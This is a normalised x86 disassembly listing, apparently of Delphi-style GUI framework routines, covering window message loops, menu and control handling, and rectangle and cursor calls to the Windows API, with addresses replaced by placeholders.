mov al [ eax + lookup_table_4718d1 ]
jmp [ eax * 4 + jump_table_4718f3 ]
call sub_460748
test al 0x4
jne r-xdata
add al 0xf9
sub al 0x1a
jae r-xdata
xor edx edx
mov eax esi
call sub_4714b8
jmp r-xdata
mov dl 0x1
mov eax esi
call sub_4714b8
jmp r-xdata
mov eax esi
call sub_47cf44
mov edx [ eax + 0x40 ]
mov eax esi
call sub_4715d0
jmp r-xdata
mov eax esi
call sub_47cf0c
mov edx [ eax + 0x40 ]
mov eax esi
call sub_4715d0
jmp r-xdata
mov eax esi
call sub_470d18
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax [ esi + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
mov dx [ ebx + 0x4 ]
call sub_47cd44
mov edi eax
test edi edi
je r-xdata
mov eax esi
call sub_470d18
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540d8
test al al
je r-xdata
cmp [ esi + 0x290 ] 0x0
je r-xdata
mov eax esi
call sub_470d18
test eax eax
je r-xdata
mov eax [ edi + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x17c ]
jmp r-xdata
call sub_4477e4
jmp r-xdata
xor eax eax
call sub_44750c
jmp r-xdata
mov eax esi
call sub_470d18
mov edi eax
test [ edi + 0x31 ] 0x4
jne r-xdata
mov eax edi
call sub_479bb4
test al al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
mov eax edi
call sub_4191a8
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
dec eax
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_47b0b8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c78
mov eax [ ebp - 0x1c ]
xor ecx ecx
pop edx
call sub_408f48
mov eax [ ebp - 0xc ]
mov cx [ r-xdata ]
mov dl 0x3
call sub_4315ac
dec eax
jne r-xdata
xor ecx ecx
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov edi eax
xor ecx ecx
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x2ac ]
push eax
push 0x0
push 0xb402
mov eax [ esi + 0x2c4 ]
call sub_44f7d8
push eax
call PostMessageA
mov eax [ edi + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
mov eax [ esi + 0x210 ]
call sub_479bf4
mov edx [ ebp - 0x4 ]
call sub_419818
test edi edi
je r-xdata
mov eax esi
call sub_477b70
sub_471b3a
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x296 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x3
sub_471b60
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e6c0
cmp [ ebx + 0x296 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x2c4 ]
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x12
jne r-xdata
mov ax [ esi + 0x4 ]
add al 0xd0
sub al 0xa
jb r-xdata
mov eax [ ebx + 0x2c4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax [ edi + 0x2b0 ]
call sub_46f8a8
mov dx [ esi + 0x4 ]
call sub_47cd44
test eax eax
je r-xdata
add al 0xf9
sub al 0x1a
jae r-xdata
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
sub_471bd8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov esi [ rw-data ]
xor eax eax
push ebp
push sub_471cf1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_42447c
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_42447c
mov edx [ ebp - 0x8 ]
pop eax
call sub_4042c4
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_42452c
push eax
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_42452c
pop edx
cmp dl al
jne r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471cf8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov edx [ esi ]
mov edx [ edx + 0x88 ]
cmp eax [ edx + 0x18 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_424564
push eax
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_424564
pop edx
cmp dl al
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x1c ]
mov edx [ esi ]
mov edx [ edx + 0x88 ]
cmp eax [ edx + 0x1c ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_42444c
mov edi eax
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_42444c
cmp edi eax
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
call sub_4244f0
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x88 ]
call sub_4244f0
cmp ebx eax
je r-xdata
mov al 0x1
sub_471d04
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44ed34
push ebp
call sub_471bd8
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f0 ] al
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403324
pop esi
pop ecx
pop ebp
retn
sub_471d34
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_47d4f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ edi + 0x16c ]
cmp eax [ esi + 0x2f4 ]
jne r-xdata
cmp edi [ esi + 0x298 ]
jne r-xdata
xor eax eax
mov [ esi + 0x2f4 ] eax
jmp r-xdata
xor eax eax
mov [ esi + 0x298 ] eax
sub_471d8c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_447830
mov edi eax
call sub_446128
mov esi eax
cmp edi [ ebx + 0x298 ]
je r-xdata
mov eax edi
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540c8
lea edx [ esp + 0x8 ]
lea eax [ ebx + 0x29c ]
call sub_4170b0
test al al
jne r-xdata
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540c8
mov eax [ esp + 0x8 ]
mov [ ebx + 0x29c ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x2a0 ] eax
cmp [ ebx + 0x298 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov edx edi
mov eax ebx
call sub_47211c
cmp [ ebx + 0x298 ] 0x0
je r-xdata
cmp esi [ ebx + 0x298 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x298 ]
call sub_44a198
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x298 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x298 ]
call sub_44a198
sub_471e70
push ebx
push esi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call sub_467088
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_44f7d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_467074
mov ebx eax
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov eax ebx
call sub_44f7d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_471ed8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_472026
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_471d8c
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_470d18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46a1b4
mov eax [ ebp - 0x4 ]
call sub_470d18
call sub_47b0a8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46a1b4
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
lea ecx [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_470d18
call sub_47b0a8
mov eax [ eax + 0x7c ]
lea edx [ ebp - 0xc ]
call sub_446090
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_469e1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_471e70
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403608#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420b98
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47202d
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_472034
push ebx
push esi
push edi
mov esi edx
mov edi [ rw-data ]
mov edi [ edi ]
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push esi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ esi + 0x4 ] 0x12
je r-xdata
mov edx esi
mov eax edi
call sub_469254
test al al
jne r-xdata
mov edx esi
mov eax edi
call sub_46914c
test al al
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
push esi
call TranslateMessage
push esi
call DispatchMessageA
cmp eax 0x108
ja r-xdata
xor ebx ebx
jmp r-xdata
sub_4720d8
push ebx
mov ebx eax
mov eax ebx
call sub_46e584
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_47211c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x298 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x298 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421038
mov edx ebx
call sub_420e08
sub_472150
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46d870
mov dl 0x6
mov eax esi
call sub_448498
mov [ esi + 0x1cc ] 0x1
mov edx 0x2
mov eax esi
call sub_46db18
lea edx [ esi + 0x80 ]
mov eax [ rw-data ]
call sub_405c78
mov dl 0x1
mov eax esi
call sub_46db34
mov dl 0x3
mov eax esi
call sub_46db50
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4721e4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x1
push 0x0
push esi
call OffsetRect
push 0xfffffffc
push 0xfffffffe
push esi
call InflateRect
cmp [ ebx + 0x1ab ] 0x0
je r-xdata
mov eax ebx
call sub_472298
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax ebx
call sub_472298
call sub_47ea90
call sub_47bc78
mov edx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424a38
jmp r-xdata
mov edx esi
mov eax ebx
call sub_46d324
pop esi
pop ebx
retn
sub_472254
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push 0x1
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
push 0xfffffffc
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov ecx ebx
mov edx esp
mov eax esi
call sub_46d388
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4722b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_46fca4
mov eax [ edi + 0x50 ]
or eax [ r-xdata ]
mov [ edi + 0x50 ] eax
xor edx edx
mov eax edi
call sub_448ecc
xor edx edx
mov eax edi
call sub_448498
mov dl 0x2
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x134 ]
xor edx edx
mov eax edi
call sub_44f8f8
mov dl [ r-xdata ]
mov eax edi
call sub_42eb24
mov dl 0x1
mov eax edi
call sub_42eb4c
mov dl 0x1
mov eax edi
call sub_42eb60
xor edx edx
mov eax edi
call sub_47de08
xor edx edx
mov eax edi
call sub_47dde0
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
add esp 0xfffffff0
call sub_40348c
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x1024
call SystemParametersInfoA
test eax eax
je r-xdata
mov edx [ esi + 0x214 ]
mov eax edi
call sub_47d994
mov eax edi
test bl bl
je r-xdata
cmp [ ebp - 0x4 ] 0x1
sbb edx edx
inc edx
mov eax edi
call sub_47334c
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4723a8
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x210 ]
test eax eax
je r-xdata
xor edx edx
mov eax esi
call sub_448ecc
lea eax [ esi + 0x30c ]
call sub_40d31c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46fd30
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x18 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4723f0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov edx [ ebx + 0x16c ]
mov eax esi
call sub_47dbd4
mov edi eax
mov edx [ ebx + 0x16c ]
mov eax esi
call sub_47d214
mov ebp eax
mov eax [ ebx + 0x16c ]
call sub_47b8c0
test al al
je r-xdata
test edi edi
je r-xdata
mov al [ r-xdata ]
mov [ esp ] al
cmp [ esi + 0x295 ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_47b8c0
test al al
je r-xdata
cmp [ esi + 0x295 ] 0x0
je r-xdata
test edi edi
je r-xdata
mov eax ebp
call sub_47b8c0
test al al
je r-xdata
mov ebx [ edi + 0x40 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov dl [ esp ]
mov eax ebx
call sub_474c88
jmp r-xdata
test ebp ebp
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x140 ]
cmp eax [ ebx + 0x16c ]
je r-xdata
mov eax edi
call sub_47b8c0
test al al
jne r-xdata
mov ebx [ ebp + 0x40 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
mov dl [ ebx + 0x1a8 ]
or dl [ r-xdata ]
mov eax ebx
call sub_474c88
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
cmp eax [ ebx + 0x16c ]
je r-xdata
mov eax ebp
call sub_47b8c0
test al al
jne r-xdata
mov al [ r-xdata ]
or al [ esp ]
mov [ esp ] al
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
mov dl [ ebx + 0x1a8 ]
or dl [ r-xdata ]
mov eax ebx
call sub_474c88
mov al [ r-xdata ]
or al [ esp ]
mov [ esp ] al
sub_47255f
mov eax esi
call sub_47eabc
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
pop esi
retn
mov eax esi
call sub_470d18
test eax eax
je r-xdata
mov eax esi
call sub_470d18
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax esi
call sub_470d18
mov eax [ eax + 0x40 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_4725a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x190 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x188 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44ec6c
pop esi
pop ebx
retn
sub_4725d4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47022c
mov esi eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x184 ]
mov eax esi
pop esi
pop ebx
retn
mov eax [ esi + 0x16c ]
call sub_47b8c0
test al al
je r-xdata
mov [ ebx + 0x294 ] 0x1
xor edx edx
mov eax esi
call sub_448ecc
sub_472638
push ebx
mov ebx eax
mov eax ebx
call sub_47c2a4
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax ebx
call sub_47cf44
test eax eax
je r-xdata
mov eax ebx
call sub_472c5c
sub_472668
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c664
mov eax [ ebx + 0x30 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov [ esi + 0x24 ] 0x809
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xbfffffff
or eax 0x80000000
or eax 0x4000000
or eax 0x2000000
or eax 0x0
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
or [ esi + 0x8 ] 0x8
sub_4726e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x295 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44c070
xor edx edx
push ebp
push sub_472815
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x190 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_470ab8
mov eax [ ebp - 0x4 ]
call sub_47d41c
call sub_419538
mov esi eax
dec esi
test esi esi
jl r-xdata
xor edx edx
call sub_448ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47281c
mov eax [ ebp - 0x4 ]
call sub_44c078
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2ac ]
test eax eax
je r-xdata
inc esi
xor ebx ebx
push 0x0
push 0x1
push 0x85
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x188 ]
retn
mov ecx eax
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x194 ]
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x184 ]
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xdc ]
sub_472824
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
cmp ebx eax
jne r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8b4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x164 ]
pop ebx
retn
sub_472860
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax esi
call sub_44cf0c
mov [ esi + 0x2c4 ] esi
mov eax esi
call sub_47cf44
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x138 ]
mov dl 0x1
mov eax esi
call sub_448ecc
mov eax esi
mov edx [ eax ]
call [ edx + 0x180 ]
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x164 ]
sub_4728ec
push ebx
push esi
push edi
push ebp
add esp 0xffffffbc
mov edi ecx
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
lea ecx [ esp + 0x1c ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417088
lea edx [ esp + 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_467edc
mov esi eax
mov edi [ ebx + 0x40 ]
mov [ esp ] edi
mov eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esi
call sub_466cf8
mov ebp eax
mov eax esi
call sub_466d44
add ebp eax
add edi [ ebx + 0x48 ]
cmp ebp edi
jge r-xdata
test edi edi
jne r-xdata
mov eax esi
call sub_466cf8
cmp eax [ ebx + 0x40 ]
jle r-xdata
mov eax esi
call sub_466cf8
mov edi eax
mov eax esi
call sub_466d44
add edi eax
sub edi [ ebx + 0x48 ]
mov [ esp ] edi
mov al [ ebp + 0x227 ]
sub al 0x1
jb r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov edi [ esp + 0x28 ]
lea edx [ esp + 0x34 ]
mov eax esi
call sub_466d90
add edi [ esp + 0x40 ]
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
cmp edi eax
jge r-xdata
mov eax esi
call sub_466cf8
mov [ esp ] eax
mov edx [ edi + 0x44 ]
add edx [ edi + 0x4c ]
lea ecx [ esp + 0x1c ]
mov eax [ edi + 0x40 ]
inc eax
call sub_417088
lea edx [ esp + 0x1c ]
mov ecx esp
mov eax ebp
call sub_448ac4
jmp r-xdata
je r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x28 ]
cmp eax [ ebx + 0x44 ]
jle r-xdata
mov eax [ ebx + 0x44 ]
sub eax [ ebx + 0x4c ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
push 0x0
lea eax [ esp + 0xc ]
push eax
push 0x0
push 0x1b
call SystemParametersInfoA
lea edx [ esp + 0x24 ]
mov eax edi
call sub_44894c
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x1c ]
mov eax [ edi + 0x30 ]
call sub_448ac4
mov eax [ esp + 0x1c ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x10 ] eax
lea edx [ esp + 0x24 ]
mov eax edi
call sub_44894c
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x1c ]
mov eax [ edi + 0x30 ]
call sub_448ac4
mov eax [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x18 ] eax
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_467f0c
mov esi eax
mov eax esi
call sub_466cf8
cmp eax [ esp ]
jle r-xdata
mov edx [ edi + 0x44 ]
add edx [ edi + 0x4c ]
mov eax [ edi + 0x40 ]
sub eax [ ebx + 0x48 ]
add eax [ edi + 0x48 ]
lea ecx [ esp + 0x1c ]
call sub_417088
lea edx [ esp + 0x1c ]
mov ecx esp
mov eax ebp
call sub_448ac4
jmp r-xdata
jmp r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x28 ]
cmp eax [ esp + 0x4 ]
jle r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x28 ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x2c ]
push eax
lea edx [ esp + 0x38 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x38 ]
pop edx
call sub_4728e0
mov edx [ esp ]
add edx [ ebx + 0x48 ]
cmp eax edx
jge r-xdata
mov eax esi
call sub_466cf8
mov [ esp ] eax
lea edx [ esp + 0x24 ]
mov eax edi
call sub_44894c
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax [ edi + 0x30 ]
call sub_448ac4
mov eax [ edi + 0x48 ]
add [ esp ] eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x44
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x28 ]
mov [ esp + 0x4 ] eax
jmp r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x30 ]
cmp eax [ ebx + 0x4c ]
jge r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x2c ]
push eax
lea edx [ esp + 0x38 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x38 ]
pop edx
call sub_4728e0
sub eax [ ebx + 0x48 ]
mov [ esp ] eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x30 ]
push eax
lea edx [ esp + 0x38 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x3c ]
pop edx
call sub_4728e0
mov ebp [ esp + 0x4 ]
mov edx ebp
add edx [ ebx + 0x4c ]
cmp eax edx
jge r-xdata
mov eax esi
call sub_466d2c
mov [ esp + 0x4 ] eax
jmp r-xdata
lea edx [ esp + 0x24 ]
mov eax esi
call sub_466d90
mov eax [ esp + 0x24 ]
push eax
lea edx [ esp + 0x38 ]
